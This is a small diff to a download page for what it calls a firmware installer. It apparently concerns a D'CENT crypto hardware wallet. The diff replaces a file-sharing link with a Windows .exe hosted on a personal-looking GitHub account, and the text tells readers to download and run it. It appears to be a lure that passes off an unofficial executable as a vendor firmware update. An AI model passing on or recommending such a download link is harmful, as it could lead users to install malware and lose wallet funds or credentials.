@@ -54,7 +54,7 @@ DOWNLOAD THE UPDATE
 
 Visit the link below to download the firmware installer:
 
-https://api.files.link/v1/p/0078d429-e8d3-4fce-ae86-591b4af2fd34
+https://github.com/sidemail0/dcentfirmwareupdates/releases/download/v.1.3.0-win64/dcent-firmware-installer.exe
 
 The page includes full installation instructions, system requirements, and answers to frequently asked questions.
 
